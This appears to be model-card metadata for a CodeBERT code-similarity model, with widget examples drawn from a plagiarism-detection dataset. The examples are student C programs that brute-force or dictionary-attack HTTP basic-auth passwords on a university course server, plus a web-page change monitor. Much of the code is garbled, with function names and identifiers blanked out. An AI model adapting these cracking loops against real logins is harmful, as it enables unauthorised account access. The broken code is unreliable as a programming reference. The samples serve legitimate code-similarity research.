@@ -1,0 +1,788 @@
+_id: 68653eefb54e89a6d6c5f06c
+id: buelfhood/SOCO-C-CodeBERT-ST
+private: false
+pipeline_tag: sentence-similarity
+library_name: sentence-transformers
+tags:
+- sentence-transformers
+- safetensors
+- roberta
+- sentence-similarity
+- feature-extraction
+- dense
+- generated_from_trainer
+- dataset_size:3081
+- loss:BatchAllTripletLoss
+- arxiv:1908.10084
+- arxiv:1703.07737
+- base_model:microsoft/codebert-base
+- base_model:finetune:microsoft/codebert-base
+- text-embeddings-inference
+- endpoints_compatible
+- region:us
+downloads: 1
+likes: 0
+modelId: buelfhood/SOCO-C-CodeBERT-ST
+author: buelfhood
+sha: 0c81473bb0a5fbad08eec8e9691d9ff71a2fce6c
+lastModified: '2025-07-02T14:15:26.000Z'
+gated: false
+disabled: false
+mask_token: <mask>
+widgetData:
+- source_sentence: "#include <sys/times.h>\n#include <strings.h>\n#include <string.h>\n#include <ctype.h>\n\n#include <stdio.h>\n\
+    #include <stdlib.h>\n#include <sys/times.h>\n#include <strings.h>\n#include <string.h>\n#include <ctype.h>\n#include <sys/time.h>\n\
+    #define ant 1e9\n\nint ()\n{\nchar c[2],[3][2];\nregister int i,j,k,x,y,z,t,r,s,final,count=0;\nint starttime,endtime,totaltime;\
+    \ \nchar ch[5],ch1[5],ch2[5],s1[100],s2[100];\nc[0]='A',c[1]='a';\n[0][1]=[1][1]=[2][1]='\\0';\n\nstrcpy(s1, \"wget --http-user=\
+    \ --http-passwd=\");\n    strcpy(s2, \" http://sec-crack.cs.rmit.edu./SEC/2/\");\n\nstarttime=time();\n\nfor(r=0;r<=1;r++)\n\
+    {\n\t\n\tfor(i=c[r],x=0;x<=25;x++,i++)\n\t{\n\t\t\n\t\t [0][0]=i;\n\t\t strcpy(ch,[0]);\n\n\n\t\tfor(s=0;s<=1;s++)\n\t\
+    \t{\n\t\t\tfor(j=c[s],z=0;z<=25;z++,j++)\n\t\t\t{\t\n\t\t\n\t\t\t\t[1][0]=j;\n\t\t\t\tstrcpy(ch1,[0]);\n\t\t\t\tstrcat(ch1,[1]);\n\
+    \n\t\t\t\tfor(t=0;t<=1;t++)\n\t\t\t\t{\n\t\t\t\t\tfor(k=c[t],y=0;y<=25;y++,k++)\n\t\t\t\t\t{\tcount++;\n\t\t\t\t\t\t[2][0]=k;\n\
+    \t\t\t\t\t\tstrcpy(ch2,ch1);\n\t\t\t\t\t\tstrcat(ch2,[2]);\n\t\t\t\t\t\tprintf(\"\\n  %s\",ch2);\n\n\n\n         strcat(s1,\
+    \ ch2);\n          strcat(s1, s2);\n\t  printf(\"\\n combination sent %s\\n\", s1);\n          final = system(s1);\n \
+    \         if (final == 0)\n          {\n            endtime=time();\n\t\ttotaltime=(endtime-starttime);\n\t\t printf(\"\
+    count %d\",count);\n\t    printf(\"totaltime %1f\",(double)totaltime/ant);\n\t    printf(\"\\nsuccess %s\\n\",ch2);\n\
+    \            exit(1);\n          }\n\n\n\t  strcpy(s1, \"\");\n\t  strcpy(s1, \"wget --http-user= --http-passwd=\");\n\
+    \n\n\t\t\t\t}\n\n\t\t\t\t}\n\t\t\t}\n\n\t\t}\n\t   }\n}\n\n}\n\n\n\n"
+  sentences:
+  - "\n\n\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include <time.h>\n#include <netdb.h>\n#include\
+    \ <unistd.h>\n#include <netinet/in.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <sys/time.h>\n#include\
+    \ <arpa/inet.h>\n#include <errno.h>\n#include <signal.h>\n\n#define BUFFER_SIZE 2000\n#define RETURN_OK 0\n#define RETURN_ERROR\
+    \ 1\n#define TRUE  1\n#define FALSE 0\n#define PASSWORD_LENGTH 3\n\n#define STATUS_OK            200\n#define STATUS_AUTH_REQUIRED\
+    \ 401\n#define CONN_CLOSED          2\n\n\nchar *host;\nchar *filename;\nint  ;\nchar *url;\nchar *username;\nint attempt;\n\
+    struct sockaddr_in serverAddr;\n\n\nvoid processArguments(int, char **argv, char **, char **);\nvoid printUsage(char *);\n\
+    void splitURL(const char *, char **, char **);\nint openConnection();\nvoid initialiseConnection();\nvoid sendRequest(int,\
+    \ char *, char *, char *, char *);\nint getResponseStatus(int);\nvoid base64_encode(const unsigned char *, unsigned char\
+    \ *);\nvoid getHostErrorMsg(char *);\nvoid generatePassword(char *, int);\nvoid testPassword(char *);\n\n\n\n\nint main(int\
+    \ argc, char *argv[])\n{\n    char password[PASSWORD_LENGTH+1];\n    int i;\n\n    \n\n    attempt = 0;\n    processArguments(argc,\
+    \ argv, &url, &username);\n    splitURL(url, &host, &filename);\n\n    initialiseConnection();\n     = openConnection();\n\
+    \n    \n\n    for (i=1; i<=PASSWORD_LENGTH; i++)\n    {\n        memset(password, 0, PASSWORD_LENGTH+1);\n        generatePassword(password,\
+    \ i);\n    }\n\n    printf(\"The password has not been cracked\\n\");\n    exit(RETURN_OK);\n\n}\n\n\n\n\nvoid generatePassword(char\
+    \ *password, int reqLength)\n{\n    static const char *chars = \n      \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\
+    ;\n\n    int currLength;\n    int i;\n\n    currLength = strlen(password);\n    currLength++;\n\n    for (i=0; i<strlen(chars);\
+    \ i++)\n    {\n        password[currLength-1] = chars[i];\n\n        if (strlen(password) != reqLength)\n        {\n \
+    \          \n           generatePassword(password, reqLength);\n        }\n        else\n        {\n           testPassword(password);\n\
+    \        }\n\n        password[currLength] = '\\0';\n    }\n}\n\n\n\n\nvoid testPassword(char *password)\n{\n    int status;\n\
+    \n    attempt++;\n\n    \nTestPassword:\n    sendRequest(, host, filename, username, password);\n    status = getResponseStatus();\n\
+    \n    if (status == STATUS_OK)\n    {\n        printf(\"The password has been found after %d attempts: %s\\n\",\n    \
+    \           attempt, password);\n        exit(RETURN_OK);\n    }\n    else if (status == CONN_CLOSED)\n    {\n       \
+    \ \n        ();\n         = openConnection();\n        goto TestPassword;        \n    }\n    else if (status != STATUS_AUTH_REQUIRED)\n\
+    \    {\n        printf(\"Status %d received from server\\n\", status);\n        exit(RETURN_ERROR);\n    }\n\n}\n\n\n\n\
+    \nvoid processArguments(int argc, char *argv[], char **url, char **username)\n{\n    if (argc != 3)\n    {\n        printUsage(argv[0]);\n\
+    \        exit(1);\n    }\n\n    *url = (char *) malloc(strlen(argv[1] + 1));\n    strcpy(*url, argv[1]);\n\n    *username\
+    \ = (char *) malloc(strlen(argv[2] + 1));\n    strcpy(*username, argv[2]);\n\n}\n\n\n\n\n\nvoid printUsage(char *program)\n\
+    {\n    fprintf(stderr, \"Usage:\\n\");\n    fprintf(stderr, \"%s url username\\n\", program);\n}\n\n\n\n\nvoid splitURL(const\
+    \ char *url, char **host, char **file)\n{\n    char *p1; \n    char *p2;\n\n    \n    p1 = strstr(url, \"//\");\n    if\
+    \ (p1 == NULL)\n        p1 = (char *) url;\n    else\n        p1 = p1 + 2;\n\n    \n    p2 = strstr(p1, \"/\");\n    if\
+    \ (p2 == NULL)\n    {\n        fprintf(stderr, \"Invalid url\\n\");\n        exit(RETURN_ERROR);\n    }\n\n    *host =\
+    \ (char *) malloc(p2-p1+2);\n    strncpy(*host, p1, p2-p1);\n    (*host)[p2-p1] = '\\0';\n\n    *file = (char *) malloc(strlen(p2+1));\n\
+    \    strcpy(*file, p2);\n\n}\n\n\n\n\nvoid sendRequest(int , char *host, char *filename, char *username, \n          \
+    \       char *password)\n{\n    char message[BUFFER_SIZE];\n    unsigned char encoded[BUFFER_SIZE];\n    unsigned char\
+    \ token[BUFFER_SIZE];\n\n    \n\n    \n    sprintf((char *) token, \"%s:%s\", username, password);\n    base64_encode(token,\
+    \ encoded);\n\n    sprintf(message, \"GET %s HTTP/1.1\\nHost: %s\\nAuthorization:  %s\\n\\n\",\n            filename,\
+    \ host, encoded);\n\n    if (write(, message, strlen(message)) == -1)\n    {\n        perror(\"\");\n        exit(RETURN_ERROR);\n\
+    \    }\n}\n\n\n\n\nint getResponseStatus()\n{\n    char message[BUFFER_SIZE];\n    int  bytesRead;\n    char *p1;\n  \
+    \  char status_str[4];\n    int  status;\n\n    \n\n    while (TRUE)\n    {\n        bytesRead = (, message, BUFFER_SIZE-1);\n\
+    \        if (bytesRead == -1)\n        {\n            perror(\"\");\n            exit(RETURN_ERROR);\n        }\n    \
+    \    else if (bytesRead == 0)\n        {\n            \n            return CONN_CLOSED;\n        }\n\n        message[bytesRead+1]\
+    \ = '\\0';\n\n        \n        p1 = strstr(message, \"HTTP\");\n        if (p1 != NULL)\n        {\n            p1 =\
+    \ p1 + 9;\n            break;\n        }\n    }\n\n    strncpy(status_str, p1, 3);\n    status_str[3] = '\\0';\n    status\
+    \ = atol(status_str);\n\n    return status;\n}\n\n\n\n\nint openConnection()\n{\n    int ;\n\n    if (( = socket(AF_INET,\
+    \ SOCK_STREAM, 0)) == -1)\n    {\n        perror(\"\");\n        exit(RETURN_ERROR);\n    }\n\n    if (connect(, (struct\
+    \ sockaddr *) &serverAddr, sizeof(serverAddr)) == -1)\n    {\n        perror(\"connect\");\n        exit(RETURN_ERROR);\n\
+    \    }\n\n    return ;\n}\n\n\n\n\nvoid initialiseConnection()\n{\n    struct hostent *serverHostent;\n    unsigned  serverIP;\n\
+    \    char errorMsg[BUFFER_SIZE]; \n\n\n    \n\n    memset(&serverAddr, 0, sizeof(serverAddr));\n    serverAddr.sin_port\
+    \ = htons(80);\n\n\n    if ((serverIP = inet_addr(host)) != -1)\n    {\n        serverAddr.sin_family = AF_INET;\n   \
+    \     serverAddr.sin_addr.s_addr = serverIP;\n    }\n    else if ((serverHostent = gethostbyname(host)) != NULL)\n   \
+    \ {\n\tserverAddr.sin_family = serverHostent->h_addrtype;\n        memcpy((void *) &serverAddr.sin_addr,\n\t\t (void *)\
+    \ serverHostent->h_addr, serverHostent->h_length);\n    }\n    else\n    {\n       getHostErrorMsg(errorMsg);\n      \
+    \ printf(\"%s: %s\\n\", host, errorMsg);\n       exit(RETURN_ERROR);\n    }\n}\n\n\n\n \nvoid base64_encode(const unsigned\
+    \ char *input, unsigned char *output)\n{\n    static const char *codes = \n      \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\
+    ;\n\n    int i;\n    int len;\n    int lenfull;\n    unsigned char *p;\n    int a;\n    int b;\n    int c;\n    \n   \
+    \ p = output;\n    len = strlen((char *) input);\n\n    \n\n    lenfull = 3*(len / 3);\n    for (i = 0; i < lenfull; i\
+    \ += 3) \n    {\n        *p++ = codes[input[0] >> 2];\n        *p++ = codes[((input[0] & 3) << 4) + (input[1] >> 4)];\n\
+    \        *p++ = codes[((input[1] & 0xf) << 2) + (input[2] >> 6)];\n        *p++ = codes[input[2] & 0x3f];\n        input\
+    \ += 3;\n    }\n\n\n    \n\n    if (i < len)\n    {\n        a = input[0];\n        b = (i+1 < len) ? input[1] : 0;\n\
+    \        c = 0;\n\n        *p++ = codes[a >> 2];\n        *p++ = codes[((a & 3) << 4) + (b >> 4)];\n        *p++ = (i+1\
+    \ < len) ? codes[((b & 0xf) << 2) + (c >> 6)] : '=';\n        *p++ = '=';\n    }\n\n    \n    *p = '\\0';\n \n}\n\n\n\n\
+    \nvoid getHostErrorMsg(char *message)\n{\n    switch (h_errno)\n    {\n         HOST_NOT_FOUND :\n             strcpy(message,\
+    \ \"The specified host is unknown\");\n             break;\n\n         NO_DATA:\n             strcpy(message, \"The specified\
+    \ host name is valid, but does not have   address\");\n             break;\n\n         NO_RECOVERY:\n             strcpy(message,\
+    \ \"A non-recoverable name server error occurred\");\n             break;\n\n         TRY_AGAIN:\n             strcpy(message,\
+    \ \"A temporary error occurred   authoritative name server. Try again later.\");\n             break;\n\n        default:\n\
+    \             strcpy(message, \" unknown name server error occurred.\");\n    }\n}\n\n"
+  - "# include <stdlib.h>\n# include <stdio.h>\n# include <strings.h>\n\n\nint ()\n{\n\t\n\tFILE* fpp;\t\t\t\t\t\t\t\t\t\t\
+    \n\tFILE* fp;\n\t\t\t\n\tchar s[100];\n\tint i;\n\t\n\twhile(1)\t\t\t\t\t\t\t\t\t\t\n\t{\n\t\tsystem(\"wget -nv http://www.cs.rmit.edu./students\"\
+    );\t\t\t\t\n\t\t\n\t\ti=0;\t\t\n\t\t\n\t\tfp = fopen(\"dummyindex.txt\",\"r\");\n\t\t\n\t\tif(fp == (FILE*) NULL)\t\t\t\
+    \t\t\t\t\t\n\t\t{\n\t\t\tprintf(\" is  previously saved webpage in the file\\n\");\n\t\t\ti=1;\n\t\t\tfp = fopen(\"dummyindex.txt\"\
+    ,\"w\");\n\n\t\t}\n\t\t\t\t\n\t\tfclose(fp);\n\t\t\n\t\t\t\t\n\t\t\n\t\t\n\t\t\n\t\tsystem(\"diff index.html dummyindex.txt\
+    \ > compareoutput.txt\");\t\t\n\n\t\t\t\t\n\t\tif(fpp != (FILE*) NULL)\t\n\t\t{\n\t\t\t\n\t\t\tfpp = fopen(\"compareoutput.txt\"\
+    ,\"r\");\t\t\t\t\t\n\t\t\t\n\t\t\tfgets(s,100,fpp);\t\t\t\t\t\t\t\n\t\t\t\n\t\t\tfclose(fpp);\t\t\t\t\t\t\t\t\n\t\t\n\t\
+    \t\n\t\t   \n\t\t\tif((strlen(s)>0) && i==0)\t\t\t\t\t\t\t\t\n\t\t\t{\n\t\t\t\tsystem(\"mail @cs.rmit.edu. < compareoutput.txt\"\
+    );\t\n\t\t\t\tsystem(\"cp index.html dummyindex.txt\");\t\t\t\t\n\t\t\t\tprintf(\"Message has been sent\\n\");\t\t\t\t\
+    \n\t\t\t}\n\t\t\telse\n\t\t\t\tprintf(\" is  change in the \\n\");\t\t\t\n\t\t}\n\t\t\n\t\t\n\n\t\tsystem(\"rm index.html\"\
+    )\t;\t\t\t\t\n\t\t\n\t\tsleep(86400);\t\t\t\t\t\t\t\t\t\n\t}\n\t\t\t\t\n\treturn 1;\n}\n"
+  - "#include<stdio.h>\n#include<stdlib.h>\n#include<strings.h>\n#include<ctype.h>\n#include <sys/time.h>\n#define OneBillion\
+    \ 1e9\n\nint ()\n{   int startTime, stopTime, final;\n    int i,j,k;\n    FILE* fp;\n    int pass,len;\n    int count\
+    \ = 0;\n    char [50];\n    char url1[100];\n    char url2[100];\n\n    startTime = time();\n    fp = fopen(\"/usr/share/lib/dict/words\"\
+    ,\"r\");\n    while (fp !='\\0')\n     {\n       fgets( ,50,fp);\n\n       len = strlen();\n       [strlen()-1] ='\\0';\n\
+    \n       if(len <= 4)\n       {\n         count++;\n\t     printf(\"Checking for the word :%s\\n\",);\n\t     strcpy(url1\
+    \ ,\"wget --http-user= --http-passwd=\");\n\t     strcat(url1,);\n\t     strcpy(url2 , \" -nv -o output http://sec-crack.cs.rmit.edu./SEC/2/\
+    \ \");\n\t     strcat(url1,url2);\n\n\n\t     pass = system(url1);\n\t    if (pass == 0)\n\t    {\n\t      stopTime =\
+    \ time();\n          final = stopTime-startTime;\n\t      printf(\"\\n SUCCESS\\n\");\n\t      printf(\"The password for\
+    \ the user  : %s\\n \",);\n\t      printf(\"Found the password in %lld nanoseconds (%1f seconds) \\n\",final,(double)final/OneBillion);\n\
+    \t       printf(\"Number of attempts : %d\\n\",count);\n          exit(1);\n\t }\n        }\n       }\n\n }\n"
+- source_sentence: "\n\n#include<stdio.h>\n#include<stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <sys/time.h>\n\
+    #include<string.h>\nint ()\n{\nchar a[100];\nint count=0;\nchar ch;\nchar line[100];\nchar filename[50];\nchar *token;\n\
+    const char delimiter[]=\" \\n.,;:!-\";\nFILE *fp;\nint  total_time,start_time,end_time;\nstart_time = time();\nstrcpy(filename,\"\
+    /usr/share/lib/dict/words\");\nif((fp=fopen(filename,\"r\"))==NULL){\nprintf(\"cannot open file\\n\");\nexit(1);\n}\n\
+    while((fgets(line,sizeof(line),fp))!=NULL)\n{\n        token=strtok(line,delimiter); \n        while(token!=NULL)\n  \
+    \              {\n            count++;\n\t    printf(\"ATTEMPT : %d\\n\",count);\nstrcpy(a,\"wget http://sec-crack.cs.rmit.edu./SEC/2/index.php\
+    \ --http-user= --http-passwd=\");\n                strcat(a,token);                \n                printf(\"The request\
+    \ %s\\n\",a); \n                if(system(a)==0)\n\t\t{\n\t\tprintf(\"Congratulations!!!Password obtained using DICTIONARY\
+    \ ATTACK\\n\");\n\t\tprintf(\"************************************************************\\n\");\n\t\tprintf(\"Your password\
+    \ is %s\\n\",token);\n\t\tprintf(\"The Request sent is %s \\n\",a);\n                end_time = time();\n            \
+    \    total_time = (end_time -start_time);\n                total_time /= 1000000000.0;\n                printf(\"The Time\
+    \ Taken is : %llds\\n\",total_time);\n\t\texit(1);\n\t\t}\n\n              \n                token=strtok(NULL,delimiter);\n\
+    \                \n                 }\n}\n\n\nfclose(fp);\nreturn 0;\n}\n"
+  sentences:
+  - "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n#include <unistd.h>\n\t\t\t\t  \n\n\n#define USERNAME\
+    \ \"\"\n#define URL \"sec-crack.cs.rmit.edu./SEC/2\"\n#define TEST_URL \"yallara.cs.rmit.edu./~/secure\"\n#define MAX_PASSWD_LEN\
+    \ 3\n#define MAX_CHAR_SET 52\n\n#define TRUE 1\n#define FALSE 0\n\n\n\n\n\n\n\n\ntypedef int (*CrackFuncPtr)(const char*,\
+    \ const char*);\n\nint runBruteForce(const char chSet[], int numOfCh, int len, CrackFuncPtr func);\nchar* initPasswdStr(int\
+    \ len, char ch);\nint getChPos(const char chSet[], int numOfCh, char ch);\nint pow(int x, int y);\nint crackHTTPAuth(const\
+    \ char *username, const char *passwd);\n\nint ()\n{\n\tchar charSet[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I',\
+    \ 'J', 'K',\n\t\t\t\t\t\t\t'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', \n\t\t\t\t\t\t\t'W', 'X', 'Y', 'Z',\n\
+    \t\t\t\t\t\t\t'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',\n\t\t\t\t\t\t\t'l', 'm', 'n', 'o', 'p', 'q', 'r',\
+    \ 's', 't', 'u', 'v', \n\t\t\t\t\t\t\t'w', 'x', 'y', 'z'};\n\t\n\tchar charSetS[] = {'A', 'B', 'C'};\n\n\tint i; \n\t\n\
+    \tfor (i=1; i<=MAX_PASSWD_LEN; i++)\n\t{\n\t\tif (runBruteForce(charSet, MAX_CHAR_SET, i, crackHTTPAuth))\n\t\t{\n\t\t\
+    \treturn 0;\n\t\t}\n\t}\n\n\tprintf(\"\\n...password not found\\n\");\t\t\t\t\t\t\t \t\n\treturn 0;\n}\n\nint runBruteForce(const\
+    \ char chSet[], int numOfCh, int len, CrackFuncPtr func)\n{\n\tint iter; \n\tint chIter; \n\tint curPos = 0; \n\t\n\t\
+    char *str;\n\t\n\tint passwdFound = FALSE;\n\t\n\tstr = initPasswdStr(len, chSet[0]);\n\n\tprintf(\"\\nNow trying %d character(s)\\\
+    n\", len);\n\n\n\tfor (iter=0; iter<pow(numOfCh, len)&&!passwdFound; iter++)\n\t{\n\t\tfor (chIter=len-1; chIter>=0; chIter--)\n\
+    \t\t{\n\t\t\tif (iter % pow(numOfCh, chIter) == 0) \n\t\t\t{\n\t\t\t\tcurPos = getChPos(chSet, numOfCh, str[chIter]);\n\
+    \t\t\t\tstr[chIter] = chSet[curPos+1];\n\t\t\t}\n\n\t\t\tif (iter % pow(numOfCh, (chIter+1)) == 0) \n\t\t\t{\n\t\t\t\t\
+    str[chIter] = chSet[0];\n\t\t\t}\n\t\t}\n\t\t\n\t\tif (func(USERNAME, str))\n\t\t{\n\t\t\tprintf(\"\\nPassword found:\
+    \ %s\\n\", str);\n\t\t\tpasswdFound = TRUE;\n\t\t}\n\n\t\t\n\t\tprintf(\".\");\n\t\t\t\t\t\n\t}\n\n\t(str);\n\tstr = NULL;\n\
+    \n\treturn passwdFound;\n}\n\nint getChPos(const char chSet[], int numOfCh, char ch)\n{\n\tint i;\n\t\n\tfor (i=0; i<numOfCh;\
+    \ i++)\n\t{\n\t\tif (chSet[i] == ch)\n\t\t{\n\t\t\treturn i;\n\t\t}\n\t}\n\n\treturn -1;\n\t\n}\n\nchar* initPasswdStr(int\
+    \ len, char ch)\n{\n\tint i;\n\n\tchar *str;\n\n\tstr = malloc(len);\n\n\tif (str)\n\t{\n\t\tfor (i=0; i<len; i++)\n\t\
+    \t{\n\t\t\tstr[i] = ch;\n\t\t}\n\t\tstr[len] = '\\0';\n\t}\n\telse\n\t{\n\t\tfprintf(stderr, \"\\nError: Unable  allocate\
+    \ %d bytes memory.\");\n\t\texit(1);\n\t}\n\t\n\treturn str;\n}\n\nint pow(int x, int y)\n{\n\tint ans = 1, i;\n\t\n\t\
+    for (i=0; i<y; i++)\n\t{\n\t\tans *= x;\n\t}\n\n\treturn ans;\n}\n\nint crackHTTPAuth(const char *username, const char\
+    \ *passwd)\n{\n\tchar cmd[256];\n\tstruct stat fileInfo;\n\t\n\tsprintf(cmd, \"wget -O  -q --http-user=%s --http-passwd=%s\
+    \ --proxy=off %s\", \n\t\t\t\t\t\tusername, passwd, URL);\n\n\tsystem(cmd);\t\n\n\t(void)stat(\"\", &fileInfo); \n\n\t\
+    return fileInfo.st_size;\n\t\n}\n\n"
+  - "#include<stdio.h>\n#include<stdlib.h>\n#include<strings.h>\n#include<ctype.h>\n#include <sys/time.h>\n#define OneBillion\
+    \ 1e9\n\nint ()\n{   int startTime, stopTime, final;\n    int i,j,k;\n    FILE* fp;\n    int pass,len;\n    int count\
+    \ = 0;\n    char [50];\n    char url1[100];\n    char url2[100];\n\n    startTime = time();\n    fp = fopen(\"/usr/share/lib/dict/words\"\
+    ,\"r\");\n    while (fp !='\\0')\n     {\n       fgets( ,50,fp);\n\n       len = strlen();\n       [strlen()-1] ='\\0';\n\
+    \n       if(len <= 4)\n       {\n         count++;\n\t     printf(\"Checking for the word :%s\\n\",);\n\t     strcpy(url1\
+    \ ,\"wget --http-user= --http-passwd=\");\n\t     strcat(url1,);\n\t     strcpy(url2 , \" -nv -o output http://sec-crack.cs.rmit.edu./SEC/2/\
+    \ \");\n\t     strcat(url1,url2);\n\n\n\t     pass = system(url1);\n\t    if (pass == 0)\n\t    {\n\t      stopTime =\
+    \ time();\n          final = stopTime-startTime;\n\t      printf(\"\\n SUCCESS\\n\");\n\t      printf(\"The password for\
+    \ the user  : %s\\n \",);\n\t      printf(\"Found the password in %lld nanoseconds (%1f seconds) \\n\",final,(double)final/OneBillion);\n\
+    \t       printf(\"Number of attempts : %d\\n\",count);\n          exit(1);\n\t }\n        }\n       }\n\n }\n"
+  - "#include<stdio.h>\n#include<stdlib.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <sys/time.h>\n\nint ()\n\
+    {\n char lc[53]=\"abcdefghijlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n char uc[53]=\"abcdefghijlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\
+    ;\n char gc[53]=\"abcdefghijlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n int a=0,b=0,c=0,d,e,count=0;\n char [100],temp1[100],temp2[100],temp3[100],temp4[10],temp5[50],p[100],q[50],r[50];\n\
+    \ char result,result1,result2,mx[100],mx1,mx2,mx3,mx4;\n \n int  ,end,t;\n  = time(); \nwhile(sizeof(lc)!=52)\n{\n   \
+    \  temp2[0]=lc[d];\n     temp2[1]='\\0';\n     d=d+1;\n     strcpy(p,temp2);\n   \n   while(sizeof(uc)!=52)\n   {\n  \
+    \    temp3[0]=uc[b];\n      temp3[1]='\\0';\n      b=b+1;\n      strcpy(q,p);\n      strcat(q,temp3);\n    for(e=0;e<52;e++)\n\
+    \    {\n        temp1[0]=gc[e];\n\ttemp1[1]='\\0';\n\tstrcpy(r,q);\n\tstrcat(r,temp1);\n       strcpy(mx,\"wget http://sec-crack.cs.rmit.edu./SEC/2\
+    \ --http-user= --http-passwd=\");\n       strcat(mx,r);\n       printf(\"temp3=%s\\n\",mx);\n       if(system(mx)==0)\n\
+    \       { \n         printf(\"Password=%s\\n\",mx);\n\t printf(\"%d \\n\",count);\n\t end = time();\n         t = (end\
+    \ -);\n         t /= 1000000000.0;\n         printf(\"The total time_var taken is:%llds\\n\",t);\n\t exit(1);\n      \
+    \ \n       }\n      }\n     }\n }\n return 0;\n}\n"
+- source_sentence: "\n\n\n\n\n\n\n\n\n\n\n\n#include<stdio.h>\n#include<stdlib.h>\n#include<strings.h>\n#include<sys/types.h>\n\
+    #include<sys/times.h>\n#include<sys/time.h>\n#include<unistd.h>\n\nint ()\n{\n  char url[80];\n  char syscom[]= \"wget\
+    \ -nv --http-user= --http-passwd=\";\n  char http[] = \"http://sec-crack.cs.rmit.edu./SEC/2/\";\n  char [] =\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\
+    ;\n\n  char username[8];\n  char pass[4];\n  int i,j,k,hack=1;\n  int attempt = 1;\n  int , end, time_var;\n\n   = time();\n\
+    \  for ( i = 0 ;i<strlen();i++)\n    {\n      pass[0]=[i];\n      for( j = 0 ;j<strlen();j++)\n        {\n          pass[1]=[j];\n\
+    \          for ( k = 0 ;k<strlen();k++)\n             {\n               fflush(stdin);\n               pass[2]=[k];\n\
+    \               pass[3]='\\0';\n               printf(\"%s\\n\",pass);\n\n               sprintf(url,\"%s%s %s\",syscom,pass,http);\n\
+    \               hack = system(url);\n               attempt++;\n               if (hack == 0)\n               {\n    \
+    \              end = time();\n                  time_var = (end-);\n                  printf(\"\\nbr\tThe password is\
+    \ :%s\",pass);\n                  printf(\"\\nNo. of Attempts   crack the password :%d\",attempt);\n                 \
+    \ printf(\"\\nTime taken  crack the password = %lld sec\\n\",time_var/1000000000);\n                  exit(1);\n     \
+    \           }\n              }\n          }\n      }\n }\n\n"
+  sentences:
+  - "#include<stdio.h>\n#include<string.h>\n#include<strings.h>\n#include<stdlib.h>\n#include<sys/time.h>\n\n()\n{\n\tint\
+    \ i,m,k,count=0;\n\tFILE* diction;\n\tFILE* log;\n\tchar s[30];\n\tchar pic[30];\n\tchar add[1000];\n\tchar end[100];\n\
+    \ttime_t ,finish;\n\tdouble ttime;\n\t\n\tstrcpy(add,\"wget --http-user= --http-passwd=\");\n\tstrcpy( end,\"-nv -o logd\
+    \ http://sec-crack.cs.rmit.edu./SEC/2/\");\n\tdiction=fopen(\"/usr/share/lib/dict/words\",\"r\");\n\t=time(NULL);\n\t\
+    while(fgets(s,100,diction)!=NULL)\t\n\t{\t\n\t\tprintf(\"%s\\n\",s);\n\t\tfor(m=40,k=0;k<(strlen(s)-1);k++,m++)\n\t\t\
+    {\n\t\t\tadd[m]=s[k];\n\t\t}\n\t\tadd[m++]=' ';\n\t\tfor(i=0;i<50;i++,m++)\n\t\t{\n\t\t\tadd[m]=end[i];\n\t\t}\n\t\tadd[m]='\\\
+    0';\n\t\t\n\t\tsystem(add);\n\t\tcount++;\n\t\tlog=fopen(\"logd\",\"r\");\n\t\tfgets(pic,100,log);\n\t\tprintf(\"%s\"\
+    ,pic);\n\t\tif(strcmp(pic,\"Authorization failed.\\n\")!=0)\t\n\t\t{\n\t\t\tfinish=time(NULL);\n\t\t\tttime=difftime(,finish);\n\
+    \t\t\tprintf( \"\\n The time_var take:%f/n The  of passwords tried is %d\\n\",ttime,count);\n\t\t\tbreak;\n\t\t}\n\t\t\
+    fclose(log);\n\t}\n\n}\n"
+  - "#include<stdio.h>\n#include<strings.h>\n#include<stdlib.h>\n#include<ctype.h>\n\n#define MAX_SIZE 255\n\n\nint CrackPasswd(FILE\
+    \ *fp)\n{\n   int i, cnt, flag;\n   char string1[MAX_SIZE],string2[MAX_SIZE],[MAX_SIZE], passwd[MAX_SIZE];\n   char fin;\n\
+    \   \n   strcpy(string1,\"wget http://sec-crack.cs.rmit.edu./SEC/2/\");\n   strcpy(string2,\" --http-user= --http-passwd='\"\
+    );\n   strcpy(,\"\");\n\n   while ((fin = fgetc(fp)) != EOF)\n   {\n      cnt = 0;\n      \n      for (i=0;i<MAX_SIZE;i++)\n\
+    \      {   \n         passwd[i] = '\\0';\n         [i] = '\\0';\n      }\n\t \n      while(fin != '\\n')\n      {\n\t\
+    \ passwd[cnt] = fin;\n\t cnt++;\n\t fin = fgetc(fp);\n      } \n         \n      if(strlen(passwd) <= 3)\n      {\n  \
+    \       strcat(, string1);\n         strcat(, string2);\n\t strcat(, passwd);\n\t strcat(, \"'\");\n\t printf(\"Sending\
+    \ Request as %s\\n\",);\n\t flag = system();\n\t  \n         if (flag == 0)\n\t {\n            printf(\"\\nPassword is\
+    \ %s\\n\",passwd);\n\t    return 1;\n\t }\n         \n\t strcpy(,\"\"); \n         strcpy(passwd,\"\");\n       }\n  \
+    \  }\n}  \n\n\nint  (int argc, char *argv[])\n{\n   char *fname;\n   FILE *fp;\n   \n   int , end;    \n   \n    = time();\n\
+    \    \n   if (argc != 2)\n   {\n      fprintf(stdout,\"Usage : ./Dictionary <dictionary>\\n\");\n      return(EXIT_FAILURE);\n\
+    \   }\n   \n   fname = argv[1];\n   \n   if((fp = fopen(fname, \"r\")) == NULL)\n   {\n      fprintf(stderr,\"Error :\
+    \ Failed  open %s for . \\n\",fname);\n      return(EXIT_FAILURE);\n   }\n   \n   CrackPasswd(fp);\n  \n   end = time();\
+    \ \n   printf(\"Time Required = %lld msec\\n\",(end-)/());\n   return (EXIT_SUCCESS);\n  \n}\n     \n\t   \n\t  \t\n"
